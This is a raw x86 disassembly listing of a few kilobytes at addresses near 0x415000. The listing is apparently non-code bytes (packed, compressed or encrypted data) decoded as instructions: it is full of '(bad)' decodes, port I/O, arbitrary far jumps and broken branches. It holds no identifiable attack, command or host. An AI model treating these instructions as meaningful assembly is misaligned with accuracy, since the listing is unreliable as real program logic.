  414f8f:	xor    dl,bh
  414f91:	test   eax,0xdd59a061
  414f96:	dec    ebp
  414f97:	mov    ah,0xfc
  414f99:	jge    0x414fa0
  414f9b:	outs   dx,BYTE PTR ds:[esi]
  414f9c:	xchg   ebx,eax
  414f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f9e:	lods   eax,DWORD PTR ds:[esi]
  414f9f:	jae    0x414f9c
  414fa1:	inc    ebp
  414fa2:	xor    eax,0x7b72e798
  414fa7:	aad    0xe1
  414fa9:	ins    DWORD PTR es:[edi],dx
  414faa:	(bad)  
  414fab:	xor    dl,BYTE PTR [ecx+0x58]
  414fae:	(bad)
  414fb2:	test   eax,0xdce78d24
  414fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fb8:	shl    edi,0x48
  414fbb:	inc    esp
  414fbc:	xchg   ebp,eax
  414fbd:	mov    es:0x56a4b3b1,eax
  414fc3:	sub    DWORD PTR [esi-0x7f],0x557ecea5
  414fca:	adc    esp,DWORD PTR [esi+edx*2+0x9]
  414fce:	pop    eax
  414fcf:	cmp    al,0x54
  414fd1:	cmp    eax,0xe12297d
  414fd6:	and    eax,0x1d593440
  414fdb:	pop    edi
  414fdc:	dec    ebp
  414fdd:	jne    0x415041
  414fdf:	fisubr WORD PTR [edi+0x882deca]
  414fe5:	pushf  
  414fe6:	or     dh,bh
  414fe8:	sbb    eax,0xd7d62f11
  414fed:	js     0x414fbd
  414fef:	aam    0x65
  414ff1:	sub    eax,0x4dce39b8
  414ff6:	xchg   ebx,eax
  414ff7:	imul   ebx,DWORD PTR [eax],0x5f068ba6
  414ffd:	les    ebx,FWORD PTR [ebx-0x22]
  415000:	pop    eax
  415001:	jg     0x414fe3
  415003:	mov    edi,0xdec1a26f
  415008:	enter  0x67de,0x56
  41500c:	push   ds
  41500d:	mov    edx,0xe96f99f1
  415012:	addr16 ss push esp
  415015:	mov    edi,edi
  415017:	pop    edx
  415018:	shl    edi,1
  41501a:	ins    DWORD PTR es:[edi],dx
  41501b:	sbb    al,0x66
  41501d:	inc    BYTE PTR [edx+esi*8+0x74]
  415021:	les    edx,FWORD PTR [edx+edi*8+0x3b32b30c]
  415028:	or     dl,al
  41502a:	les    edi,FWORD PTR [edx-0x15]
  41502d:	xor    eax,0xba623b
  415032:	cld    
  415033:	push   eax
  415034:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  415036:	icebp  
  415037:	push   ebx
  415038:	mov    ecx,0x2ef77d9a
  41503d:	push   ebp
  41503e:	xlat   BYTE PTR ds:[ebx]
  41503f:	add    BYTE PTR [ecx],cl
  415041:	jmp    0xbdb5:0xf292c7a7
  415048:	xor    al,0x1e
  41504a:	and    esi,DWORD PTR [edx-0x44]
  41504d:	(bad)  
  41504e:	sub    edx,esi
  415050:	mov    es,WORD PTR [edi]
  415052:	pop    ebp
  415053:	jae    0x414fe3
  415055:	pop    ebp
  415056:	push   ecx
  415057:	(bad)
  41505a:	(bad)  
  41505c:	jmp    0x4150ac
  41505e:	(bad)  
  41505f:	ja     0x41507c
  415061:	jmp    0x415075
  415063:	(bad)  
  415064:	jnp    0x4150b8
  415066:	mov    ds:0x6a4ce62b,eax
  41506b:	jg     0x41506a
  41506d:	mov    esp,DWORD PTR [eax-0x5f]
  415070:	cld    
  415071:	adc    eax,DWORD PTR [bx+si-0x52]
  415075:	stos   BYTE PTR es:[edi],al
  415076:	ins    DWORD PTR es:[edi],dx
  415077:	adc    edi,DWORD PTR [edx-0x59bdd8c1]
  41507d:	fs jge 0x4150a6
  415080:	adc    DWORD PTR [ecx-0x5bad5ca],eax
  415086:	dec    esi
  415087:	xchg   ebx,eax
  415088:	out    0x7c,eax
  41508a:	xchg   ebp,eax
  41508b:	pop    ecx
  41508c:	pop    es
  41508d:	cs mov ebp,0xea17cedb
  415093:	bound  esp,QWORD PTR [ebp+0xa6099fe]
  415099:	les    edi,FWORD PTR [edx]
  41509b:	inc    eax
  41509c:	daa    
  41509d:	push   0x35
  41509f:	daa    
  4150a0:	or     ecx,ecx
  4150a2:	outs   dx,BYTE PTR ds:[esi]
  4150a3:	std    
  4150a4:	add    esi,ebx
  4150a6:	mov    al,0x50
  4150a8:	xchg   esp,eax
  4150a9:	and    DWORD PTR [ebx+esi*2-0x57195857],edx
  4150b0:	mov    BYTE PTR [ebp+0x79],cl
  4150b3:	mov    ecx,DWORD PTR [ebx+0x49]
  4150b6:	jmp    0x4150bb
  4150b8:	jno    0x4150ef
  4150ba:	add    ch,BYTE PTR [esi+edi*1-0x6b1283a8]
  4150c1:	mov    ecx,eax
  4150c3:	icebp  
  4150c4:	mov    dh,0x34
  4150c6:	jnp    0x41505e
  4150c8:	dec    esp
  4150c9:	aam    0xd9
  4150cb:	out    0x5b,al
  4150cd:	sub    esp,edi
  4150cf:	test   BYTE PTR [edi*2-0x4c69526],bh
  4150d6:	loope  0x41512b
  4150d8:	push   edx
  4150d9:	sahf   
  4150da:	pushf  
  4150db:	gs sbb eax,0x5a72ac17
  4150e1:	cmc    
  4150e2:	dec    edi
  4150e3:	push   eax
  4150e4:	rcl    DWORD PTR ss:[esi],cl
  4150e7:	inc    ebx
  4150e8:	ret    
  4150e9:	outs   dx,DWORD PTR ds:[esi]
  4150ea:	aad    0xa4
  4150ec:	out    dx,eax
  4150ed:	dec    esp
  4150ee:	cwde   
  4150ef:	(bad)
  4150f3:	out    dx,eax
  4150f4:	(bad)
  4150f8:	mov    bl,0x2b
  4150fa:	imul   edi,DWORD PTR [esi+0x7d],0x1d
  4150fe:	jl     0x41512e
  415100:	inc    edi
  415101:	scas   eax,DWORD PTR es:[edi]
  415102:	mov    al,0x1e
  415104:	aas    
  415105:	lea    ebx,[ecx]
  415107:	pop    ss
  415108:	push   ss
  415109:	xchg   ebx,eax
  41510a:	sbb    bh,al
  41510c:	xchg   ebp,eax
  41510d:	call   0x318a:0x7cd8430d
  415114:	out    0xe5,al
  415116:	ret    0xf050
  415119:	add    ecx,DWORD PTR [esp+eax*1+0x5a]
  41511d:	scas   al,BYTE PTR es:[edi]
  41511e:	pop    eax
  41511f:	pop    edi
  415120:	jg     0x4150f4
  415122:	dec    edi
  415123:	inc    ebp
  415124:	sbb    DWORD PTR [esi],ecx
  415126:	call   0x2516:0x75f92118
  41512d:	cmp    edi,ecx
  41512f:	ss xchg ebx,eax
  415131:	inc    esp
  415132:	out    dx,al
  415133:	dec    edx
  415134:	mul    esi
  415136:	cmc    
  415137:	xor    al,0x1a
  415139:	scas   eax,DWORD PTR es:[edi]
  41513a:	jl     0x4151b0
  41513c:	pop    di
  41513e:	les    edx,FWORD PTR [edx+0x34]
  415141:	jbe    0x4151a3
  415143:	mov    ds:0xda6952f8,al
  415148:	cmp    al,0x4e
  41514a:	je     0x4150ed
  41514c:	test   al,0x33
  41514e:	pop    edi
  41514f:	test   edx,ebx
  415151:	sbb    al,0x15
  415153:	int    0x56
  415155:	or     ah,BYTE PTR [ecx]
  415157:	xchg   edx,eax
  415158:	and    al,0x53
  41515a:	fs adc dl,0xe3
  41515e:	out    0x8b,eax
  415160:	jbe    0x4151c2
  415162:	(bad)  
  415163:	mov    cl,0xdd
  415165:	fcmovbe st,st(6)
  415167:	dec    ecx
  415168:	(bad)  
  415169:	xor    DWORD PTR [ecx],edi
  41516b:	inc    esi
  41516c:	sbb    BYTE PTR [edi],dh
  41516e:	push   cs
  41516f:	and    eax,0x8d3f4505
  415174:	in     eax,dx
  415175:	in     eax,0xfd
  415177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415178:	pop    esi
  415179:	punpckhwd mm0,QWORD PTR [ebp+0x38]
  41517d:	sbb    BYTE PTR ds:0xa8035996,bh
  415183:	xchg   esp,eax
  415184:	sub    al,0x20
  415186:	jae    0x41517a
  415188:	ficom  WORD PTR [edi+ebx*8]
  41518b:	xor    al,0x5d
  41518d:	addr16 (bad) 
  415190:	out    0xe2,al
  415192:	into   
  415193:	mov    BYTE PTR [ebp-0x6d491d8f],dh
  415199:	jl     0x4151de
  41519b:	(bad)  
  41519c:	jmp    0xd9bf482b
  4151a1:	ss cmp al,0xd0
  4151a4:	les    edx,FWORD PTR [ebx+0x53]
  4151a7:	or     bh,cl
  4151a9:	dec    edi
  4151aa:	and    edi,DWORD PTR [ecx]
  4151ac:	lea    edi,[edi]
  4151ae:	sar    eax,1
  4151b0:	xor    ch,ah
  4151b2:	stos   BYTE PTR es:[edi],al
  4151b3:	mov    cl,dl
  4151b5:	xor    BYTE PTR [ebx+0x7a],al
  4151b8:	mov    al,0xc2
  4151ba:	sbb    BYTE PTR [eax-0x5948dcbf],cl
  4151c0:	mov    al,0x6c
  4151c2:	adc    ebx,DWORD PTR [edi+0x60]
  4151c5:	and    bl,BYTE PTR [ecx+ebp*4]
  4151c8:	add    BYTE PTR [ebx-0x4f],0xd5
  4151cc:	lea    esi,[eax+0x40]
  4151cf:	jno    0x4151c3
  4151d1:	out    dx,eax
  4151d2:	jp     0x415230
  4151d4:	sub    al,0x59
  4151d6:	arpl   WORD PTR [esi+0x41],sp
  4151d9:	sub    al,0x92
  4151db:	fst    DWORD PTR [esi+0x7a]
  4151de:	cmp    al,0xea
  4151e0:	xor    BYTE PTR [edi-0x2863777c],0xd1
  4151e7:	and    edx,esp
  4151e9:	dec    edx
  4151ea:	aas    
  4151eb:	icebp  
  4151ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151ed:	push   eax
  4151ee:	xchg   esp,eax
  4151ef:	sbb    eax,0xdb4335af
  4151f4:	data16 out 0x42,al
  4151f7:	sub    eax,ecx
  4151f9:	sahf   
  4151fa:	push   edx
  4151fb:	into   
  4151fc:	retf   0xebf8
  4151ff:	inc    esi
  415200:	jge    0x4151be
  415202:	ins    BYTE PTR es:[edi],dx
  415203:	sub    al,0x19
  415205:	jecxz  0x415237
  415207:	xlat   BYTE PTR ds:[ebx]
  415208:	sub    al,bl
  41520a:	xchg   esp,eax
  41520b:	mov    dl,0x25
  41520d:	add    al,0x8
  41520f:	shl    DWORD PTR [eax-0x2224d01],0xfb
  415216:	sbb    dh,bl
  415218:	xchg   edx,eax
  415219:	jge    0x4151e9
  41521b:	and    BYTE PTR [edx-0x66],dh
  41521e:	mov    dh,0x1f
  415220:	fcmovnu st,st(5)
  415222:	adc    DWORD PTR [edx+0x232d108b],0xeeaa6690
  41522c:	inc    ebp
  41522d:	jb     0x415227
  41522f:	mov    eax,0xb20dc4b5
  415234:	lods   eax,DWORD PTR ds:[esi]
  415235:	inc    esp
  415236:	xchg   ebx,eax
  415237:	lds    ebx,FWORD PTR [ecx]
  415239:	jno    0x4152a9
  41523b:	div    DWORD PTR [esi]
  41523d:	stc    
  41523e:	adc    al,BYTE PTR [ebx]
  415240:	mov    ah,0x33
  415242:	or     edx,DWORD PTR [edx+0x4e]
  415245:	sbb    DWORD PTR [esp+eax*8+0x58c6eb4b],ebx
  41524c:	stos   BYTE PTR es:[edi],al
  41524d:	lds    esi,FWORD PTR [ebx-0x273252b4]
  415253:	pop    es
  415254:	sbb    BYTE PTR [esi],bh
  415256:	pop    ds
  415257:	cli    
  415258:	dec    ebp
  415259:	mov    al,ds:0xb6954259
  41525e:	pop    ecx
  41525f:	in     eax,0x29
  415261:	aam    0x42
  415263:	ss xor esp,ebx
  415266:	scas   al,BYTE PTR es:[edi]
  415267:	and    eax,0x63fc0ead
  41526c:	rcr    DWORD PTR [esi+0x4471c9e7],cl
  415272:	retf   
  415273:	test   DWORD PTR [ecx],eax
  415275:	push   ecx
  415276:	jp     0x415295
  415278:	push   0x7b
  41527a:	jae    0x4152de
  41527c:	xor    DWORD PTR [esp+ecx*2],edx
  41527f:	test   al,0x2a
  415281:	jle    0x4152a9
  415283:	push   ecx
  415284:	shr    al,cl
  415286:	es sub al,0xf
  415289:	sbb    eax,0x6392fa0f
  41528e:	lea    ecx,[ecx+0x3fede114]
  415294:	push   edx
  415295:	shl    BYTE PTR [eax+0x6d],1
  415298:	add    bh,bh
  41529a:	push   ebp
  41529b:	fmul   DWORD PTR [edx]
  41529d:	stos   BYTE PTR es:[edi],al
  41529e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41529f:	mov    edx,DWORD PTR [ecx-0x3de96c5c]
  4152a5:	ja     0x4152b3
  4152a7:	stos   BYTE PTR es:[edi],al
  4152a8:	mov    DWORD PTR [eax+esi*2+0x60],esp
  4152ac:	pop    esi
  4152ad:	scas   al,BYTE PTR es:[edi]
  4152ae:	ds sbb al,0xa9
  4152b1:	pop    ebp
  4152b2:	popf   
  4152b3:	retf   
  4152b4:	inc    edx
  4152b5:	(bad)  
  4152b6:	or     al,0xf4
  4152b8:	inc    edi
  4152b9:	sbb    DWORD PTR [ebx+0x17],ebp
  4152bc:	pushf  
  4152bd:	pop    ss
  4152be:	add    al,BYTE PTR [ecx+0x1cad6db5]
  4152c4:	out    dx,al
  4152c5:	int3   
  4152c6:	(bad)  
  4152c7:	xor    al,BYTE PTR [edi+eax*2]
  4152ca:	jae    0x415317
  4152cc:	mov    edx,0xa875622
  4152d1:	data16 jl 0x415335
  4152d4:	lods   eax,DWORD PTR ds:[esi]
  4152d5:	adc    al,0x4b
  4152d7:	push   edi
  4152d8:	sbb    eax,0xdfdd1f16
  4152dd:	pushf  
  4152de:	mov    eax,ds:0x3ed0cf13
  4152e3:	dec    ebx
  4152e4:	inc    esp
  4152e5:	dec    ecx
  4152e6:	(bad)  
  4152e7:	jb     0x41529c
  4152e9:	push   0x5f
  4152eb:	dec    edi
  4152ec:	retf   0x8e67
  4152ef:	lock inc esp
  4152f1:	(bad)  
  4152f2:	pop    ss
  4152f3:	out    dx,eax
  4152f4:	imul   esp,ebx,0x3aa4e45f
  4152fa:	xor    BYTE PTR [esi+0x143b6ca4],ah
  415300:	int    0x4d
  415302:	jno    0x4152c0
  415304:	(bad)  
  415305:	mov    ah,0x77
  415307:	sbb    eax,0x4573ad8f
  41530c:	ret    0xe9e8
  41530f:	and    al,0xd
  415311:	std    
  415312:	das    
  415313:	and    dh,0x46
  415316:	pop    ebx
  415317:	sub    BYTE PTR [edx+0xc12bad0],ch
  41531d:	and    eax,0xc8d5a513
  415322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415323:	push   0x41
  415325:	inc    esi
  415326:	sub    ebx,DWORD PTR [ebx+0x22b50126]
  41532c:	in     al,0x5d
  41532e:	xchg   edx,eax
  41532f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415330:	addr16 clc 
  415332:	sub    al,0x5e
  415334:	mov    eax,es:0xcc9a794f
  41533a:	or     DWORD PTR [ebp+ebx*8-0x70ec9bb1],esi
  415341:	jo     0x415340
  415343:	sub    ah,al
  415345:	jmp    0x4152fe
  415347:	sub    al,0x8c
  415349:	int3   
  41534a:	(bad)  
  41534b:	pop    ebx
  41534c:	mov    edi,0x740c15bd
  415351:	jb     0x41537b
  415353:	push   edx
  415354:	jmp    0xc273:0x54728cdf
  41535b:	or     ebx,esi
  41535d:	or     DWORD PTR [ecx-0x18],ebp
  415360:	shl    BYTE PTR [edx-0x7e],0x66
  415364:	stos   DWORD PTR es:[edi],eax
  415365:	or     BYTE PTR ds:0x5eadd945,0x5f
  41536c:	fchs   
  41536e:	xlat   BYTE PTR ds:[ebx]
  41536f:	xchg   edx,eax
  415370:	ficomp WORD PTR [esi+ebx*4+0x1e424cfa]
  415377:	in     eax,0x70
  415379:	and    BYTE PTR [eax-0x47],bl
  41537c:	sti    
  41537d:	cmp    eax,0x1cab891a
  415382:	fs add eax,0xd812e00d
  415388:	pushf  
  415389:	mov    dh,BYTE PTR [ecx-0x75d45d73]
  41538f:	push   0x29
  415391:	ins    BYTE PTR es:[edi],dx
  415392:	sbb    al,0xc5
  415394:	pop    es
  415395:	test   BYTE PTR [ecx+0x64],dl
  415398:	out    0xe2,al
  41539a:	sbb    bh,BYTE PTR [esi-0x2e98680b]
  4153a0:	dec    ecx
  4153a1:	xchg   DWORD PTR [eax+eax*2+0x44],ecx
  4153a5:	push   ds
  4153a6:	mov    ebx,0xeced2bc8
  4153ab:	dec    eax
  4153ac:	(bad)  
  4153ad:	cdq    
  4153ae:	jae    0x4153a9
  4153b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153b1:	and    eax,0x20fecca0
  4153b6:	ret    
  4153b7:	dec    ebx
  4153b8:	xchg   edx,eax
  4153b9:	adc    al,0x8c
  4153bb:	cs xchg ecx,eax
  4153bd:	nop
  4153be:	shr    BYTE PTR ds:0x5279d556,0xfb
  4153c5:	xchg   BYTE PTR [ebx-0x15],dl
  4153c8:	call   0x3d2b3c75
  4153cd:	and    al,0xb
  4153cf:	push   ds
  4153d0:	xchg   ebp,eax
  4153d1:	dec    edx
  4153d2:	popf   
  4153d3:	loopne 0x4153c3
  4153d5:	mov    WORD PTR [ecx-0x70],cs
  4153d8:	push   0x62
  4153da:	mov    edx,ebp
  4153dc:	adc    BYTE PTR [esi+0x7e2c3482],0x74
  4153e3:	xor    al,0x84
  4153e5:	lods   al,BYTE PTR ds:[esi]
  4153e6:	cld    
  4153e7:	dec    esi
  4153e8:	jmp    0xb58c:0x5c835687
  4153ef:	aaa    
  4153f0:	loopne 0x4153f3
  4153f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153f3:	xor    eax,0x3d7e0468
  4153f8:	push   esp
  4153f9:	(bad)  [eax]
  4153fb:	cmp    DWORD PTR [esi-0x26],edx
  4153fe:	or     al,0xc7
  415400:	loop   0x415400
  415402:	jbe    0x41544e
  415404:	clc    
  415405:	rcl    BYTE PTR [edi-0x5045c8df],0xe5
  41540c:	mov    ebp,DWORD PTR [edi+ebx*1+0x19]
  415410:	mov    BYTE PTR [ebx],ch
  415412:	(bad)  
  415413:	mov    dh,0x5a
  415415:	out    dx,eax
  415416:	stc    
  415417:	xchg   BYTE PTR [edx+0x23e0e932],bl
  41541d:	inc    edx
  41541e:	cmp    ch,al
  415420:	jge    0x41545c
  415422:	out    dx,eax
  415423:	dec    ch
  415425:	lods   al,BYTE PTR ds:[esi]
  415426:	fwait
  415427:	adc    cl,BYTE PTR [edi]
  415429:	mov    ?,WORD PTR [esi]
  41542b:	cdq    
  41542c:	dec    ebx
  41542d:	fisubr WORD PTR [eax-0x799486b2]
  415433:	pop    esp
  415434:	daa    
  415435:	inc    esp
  415436:	or     bh,BYTE PTR [edx+ebp*1-0x73]
  41543a:	retf   0x5e8e
  41543d:	je     0x41543a
  41543f:	add    al,0x14
  415441:	cmp    DWORD PTR [ebp-0x74],eax
  415444:	repnz xlat BYTE PTR ds:[ebx]
  415446:	adc    dh,BYTE PTR [ebx-0x46]
  415449:	jns    0x41547a
  41544b:	pop    edi
  41544c:	fadd   DWORD PTR [edi-0x2d]
  41544f:	mov    ds:0x54ef0c97,eax
  415454:	dec    eax
  415455:	mov    eax,0x7919ffa2
  41545a:	sbb    al,0x94
  41545c:	mov    ds:0x83206366,al
  415461:	xchg   edx,eax
  415462:	push   edi
  415463:	mov    ecx,0xd9335aa4
  415468:	or     eax,0x30e8aa0b
  41546d:	cmp    eax,0x40da2439
  415472:	mov    esi,0xd3733bce
  415477:	cmp    al,0x6b
  415479:	dec    eax
  41547a:	xchg   ebp,eax
  41547b:	hlt    
  41547c:	and    BYTE PTR [esp+ebx*4+0x48],dl
  415480:	mov    eax,ds:0xc78bebc8
  415485:	loopne 0x4154a6
  415487:	and    BYTE PTR [ecx-0x18],bl
  41548a:	cmp    edi,DWORD PTR [esi]
  41548c:	push   cs
  41548d:	sbb    ch,BYTE PTR [eax]
  41548f:	add    BYTE PTR [ebx-0x7b],dh
  415492:	ss jp  0x415456
  415495:	push   eax
  415496:	fdivr  DWORD PTR [edx-0x8]
  415499:	sbb    ebp,DWORD PTR [ebx]
  41549b:	mov    eax,0x982131d8
  4154a0:	or     ch,BYTE PTR [edi+0x23]
  4154a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154a4:	cdq    
  4154a5:	loopne 0x4154b7
  4154a7:	sub    eax,DWORD PTR [ebp+0x6b]
  4154aa:	sbb    eax,0x75ef477a
  4154af:	mov    ds:0x2ff7c6a8,eax
  4154b4:	mov    fs,WORD PTR [ebx-0x39294deb]
  4154ba:	mov    ebp,es
  4154bc:	add    esp,ebx
  4154be:	sub    ah,BYTE PTR [ebx-0x11e8beaa]
  4154c4:	adc    bh,BYTE PTR [edx]
  4154c6:	cmp    ch,0x2e
  4154c9:	cmovo  edi,DWORD PTR [esi+eiz*4+0x3e4df47d]
  4154d1:	pop    eax
  4154d2:	mov    ds:0x36615404,al
  4154d7:	enter  0xd7b6,0xa5
  4154db:	mov    ecx,0x6c3cf76e
  4154e0:	cmc    
  4154e1:	out    dx,eax
  4154e2:	jmp    0xdee2:0xfb60d082
  4154e9:	ffree  st(2)
  4154eb:	jg     0x415492
  4154ed:	mov    esp,0xff2ba797
  4154f2:	jo     0x4154e4
  4154f4:	adc    al,0x63
  4154f6:	mov    DWORD PTR [esi+0x11684de],eax
  4154fc:	mov    esp,0x57b53342
  415501:	jmp    0x3edb:0x97b126ea
  415508:	sbb    eax,0xef8e07f4
  41550d:	mov    ebp,0xadc5400
  415512:	shr    BYTE PTR [eax],0x6a
  415515:	or     DWORD PTR [esi],0x8f5935ae
  41551b:	mov    ebx,0x2fb44511
  415520:	gs popf 
  415522:	fisttp QWORD PTR [eax-0x4507ff74]
  415528:	popf   
  415529:	loope  0x415543
  41552b:	out    dx,al
  41552c:	repz dec ebx
  41552e:	mov    eax,ds:0x2bde2236
  415533:	xchg   edx,eax
  415534:	inc    esi
  415535:	cmp    ebp,DWORD PTR [edx*8+0x4a59c8b7]
  41553c:	popf   
  41553d:	adc    edi,eax
  41553f:	lods   eax,DWORD PTR ds:[esi]
  415540:	int    0x99
  415542:	dec    edi
  415543:	je     0x415580
  415545:	or     cl,dl
  415547:	dec    eax
  415548:	cli    
  415549:	xor    al,0x90
  41554b:	fwait
  41554c:	push   ss
  41554d:	mov    al,ds:0x7470ddd8
  415552:	pop    ecx
  415553:	adc    eax,0x285804b2
  415558:	shl    bl,cl
  41555a:	dec    ecx
  41555b:	dec    ecx
  41555c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41555d:	loop   0x4154f9
  41555f:	imul   edx,ebx,0xd73cb82a
  415565:	pop    edx
  415566:	ds daa 
  415568:	fisttp QWORD PTR [edx+0x33]
  41556b:	inc    esp
  41556c:	mov    cl,0x7f
  41556e:	fs xor DWORD PTR fs:[esi-0x47],esi
  415573:	fdiv   st,st(5)
  415575:	xchg   ecx,eax
  415576:	cmp    eax,0x6d2c8b2e
  41557b:	arpl   WORD PTR [edx],cx
  41557d:	minps  xmm3,XMMWORD PTR [ecx+0x16]
  415581:	adc    eax,0xd921369f
  415586:	jmp    0x835d:0xbe26f56b
  41558d:	loope  0x415584
  41558f:	stos   BYTE PTR es:[edi],al
  415590:	lahf   
  415591:	mov    esi,0x2a467769
  415596:	push   ss
  415597:	cmp    eax,0xfc40c915
  41559c:	xor    eax,0x10bd7fd6
  4155a1:	and    BYTE PTR [edi],bl
  4155a3:	das    
  4155a4:	ins    BYTE PTR es:[edi],dx
  4155a5:	add    ebp,edx
  4155a7:	sub    BYTE PTR [eax+esi*8+0x3a],ah
  4155ab:	imul   edx,DWORD PTR [eax+ebp*1+0x33805316],0x1aefbcd0
  4155b6:	push   eax
  4155b7:	retf   
  4155b8:	int    0x5a
  4155ba:	fcomp  DWORD PTR [edi+0x17]
  4155bd:	test   eax,0xd409d240
  4155c2:	inc    edi
  4155c4:	outs   dx,DWORD PTR ds:[esi]
  4155c5:	imul   eax,DWORD PTR [esi+0x67aec4db],0xffffff99
  4155cc:	scas   al,BYTE PTR es:[edi]
  4155cd:	and    eax,esi
  4155cf:	xchg   BYTE PTR [ebp+0x17960940],dl
  4155d5:	sar    DWORD PTR [esp+edx*8+0x3af6b76e],cl
  4155dc:	sub    ebp,DWORD PTR [edi]
  4155de:	push   cs
  4155df:	adc    eax,0x3085c034
  4155e4:	push   esi
  4155e5:	clc    
  4155e6:	cli    
  4155e7:	inc    edx
  4155e8:	fiadd  DWORD PTR ds:0x31283fd3
  4155ee:	jne    0x415579
  4155f0:	arpl   WORD PTR [ebx-0x3d],di
  4155f3:	cmp    al,0xa0
  4155f5:	push   edx
  4155f6:	sbb    bl,BYTE PTR [ebp-0x28]
  4155f9:	push   ss
  4155fa:	cdq    
  4155fb:	lahf   
  4155fc:	(bad)  
  4155fd:	imul   eax,DWORD PTR [esi-0xd92cd7c],0x2d5b194f
  415607:	and    esp,DWORD PTR [eax+edi*2+0x7e53baa4]
  41560e:	rep outs dx,DWORD PTR ds:[esi]
  415610:	push   ds
  415611:	push   eax
  415612:	adc    al,bh
  415614:	ins    DWORD PTR es:[edi],dx
  415615:	push   0x580430ae
  41561a:	outs   dx,BYTE PTR ds:[esi]
  41561b:	and    BYTE PTR [eax+0x73],ch
  41561e:	push   ecx
  41561f:	pop    edi
  415620:	dec    edi
  415621:	mov    eax,ds:0x3d800d79
  415626:	fst    QWORD PTR [edi]
  415628:	push   edx
  415629:	aaa    
  41562a:	ins    DWORD PTR es:[edi],dx
  41562b:	dec    ebx
  41562c:	lock inc ebp
  41562e:	add    al,0x8b
  415630:	ret    
  415631:	add    bh,BYTE PTR [edx]
  415633:	dec    edx
  415634:	xor    al,0x37
  415636:	int3   
  415637:	jle    0x415680
  415639:	idiv   BYTE PTR [edx-0x50]
  41563c:	add    BYTE PTR [ecx-0x25],ah
  41563f:	jb     0x4155d3
  415641:	pusha  
  415642:	hlt    
  415643:	call   0x55b:0x816dc6bd
  41564a:	inc    edi
  41564b:	dec    ecx
  41564c:	or     BYTE PTR [edi+0x2a2b00ac],dl
  415652:	mov    dl,0x4e
  415654:	push   ecx
  415655:	loopne 0x41565a
  415657:	fidiv  DWORD PTR [edx+edi*2+0x6d0be5e3]
  41565e:	into   
  41565f:	jmp    0x4156b5
  415661:	adc    eax,0xbd04f6fa
  415666:	adc    BYTE PTR [ebx+0x72],ah
  415669:	cwde   
  41566a:	je     0x415686
  41566c:	clc    
  41566d:	cwde   
  41566e:	mov    ds:0xebb1a1dc,al
  415673:	(bad)  
  415674:	jg     0x4156bb
  415676:	stos   DWORD PTR es:[edi],eax
  415677:	lods   eax,DWORD PTR ds:[esi]
  415678:	and    edi,DWORD PTR [ecx-0x59]
  41567b:	dec    edx
  41567c:	(bad)  [eax+0x7d1c73b4]
  415682:	out    dx,eax
  415683:	(bad)  
  415685:	dec    eax
  415686:	std    
  415687:	xchg   ah,dh
  415689:	imul   ecx,DWORD PTR [edi+0x24],0xf92cadec
  415690:	xchg   ebp,eax
  415691:	fstp   TBYTE PTR [eax]
  415693:	mov    WORD PTR ds:0x63633d97,cs
  415699:	arpl   WORD PTR [esi+0x6d0322f9],cx
  41569f:	daa    
  4156a0:	inc    ebx
  4156a1:	aad    0xea
  4156a3:	js     0x41569d
  4156a5:	inc    esi
  4156a6:	pop    ebx
  4156a7:	fcmovb st,st(1)
  4156a9:	cld    
  4156aa:	fsubrp st(1),st
  4156ac:	and    eax,0x8ba3010c
  4156b1:	push   ss
  4156b2:	xchg   edx,eax
  4156b3:	in     al,0xda
  4156b5:	jnp    0x4156c7
  4156b7:	ror    BYTE PTR [ebp-0x33c25d2a],0x45
  4156be:	mov    dl,0x90
  4156c0:	xchg   DWORD PTR gs:[ecx+0x2f],esi
  4156c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156c5:	pop    edi
  4156c6:	in     al,dx
  4156c7:	dec    edx
  4156c8:	popf   
  4156c9:	jecxz  0x4156b8
  4156cb:	retf   0xcaa1
  4156ce:	xchg   ecx,eax
  4156cf:	sub    eax,0xe8784088
  4156d4:	(bad)  
  4156d5:	shr    DWORD PTR [edx+0x12],cl
  4156d8:	lods   al,BYTE PTR ds:[esi]
  4156d9:	inc    esi
  4156da:	mov    edi,0xff546b92
  4156df:	bound  ecx,QWORD PTR [eax]
  4156e1:	retf   
  4156e2:	pop    ebp
  4156e3:	sahf   
  4156e4:	cmp    al,0xe8
  4156e6:	fmul   DWORD PTR [esi+ecx*2+0x0]
  4156ea:	pop    gs
  4156ec:	daa    
  4156ed:	pusha  
  4156ee:	rol    DWORD PTR [edi+ecx*1+0x14],1
  4156f2:	xor    BYTE PTR [edx+0x4a8fc16],bl
  4156f8:	push   cs
  4156f9:	pop    ebp
  4156fa:	inc    esi
  4156fb:	pop    esp
  4156fc:	sub    al,0xe7
  4156ff:	lea    eax,es:[ebp-0xf]
  415703:	lock sub DWORD PTR [edi-0x47],edi
  415707:	scas   eax,DWORD PTR es:[edi]
  415708:	stc    
  415709:	fist   DWORD PTR [ebp-0x5ef067d9]
  41570f:	das    
  415710:	cs pop ss
  415712:	adc    eax,0xc57a22ec
  415717:	outs   dx,BYTE PTR ds:[esi]
  415718:	not    cl
  41571a:	mov    esp,0xbcf11256
  41571f:	xchg   edx,eax
  415720:	rcl    DWORD PTR [ecx],1
  415722:	in     al,0xd7
  415724:	pop    edx
  415725:	cmp    al,0xd8
  415727:	pop    edi
  415728:	inc    edi
  415729:	call   0xefada2dd
  41572e:	xor    ebx,DWORD PTR [edi]
  415730:	shl    DWORD PTR [edi+ebp*2-0x37a669a6],cl
  415737:	daa    
  415738:	ins    DWORD PTR es:[edi],dx
  415739:	adc    bh,BYTE PTR [esi]
  41573b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41573c:	out    0xd,eax
  41573e:	and    DWORD PTR [eax],edx
  415740:	nop
  415741:	ret    
  415742:	ret    
  415743:	fsubr  st(4),st
  415745:	dec    esp
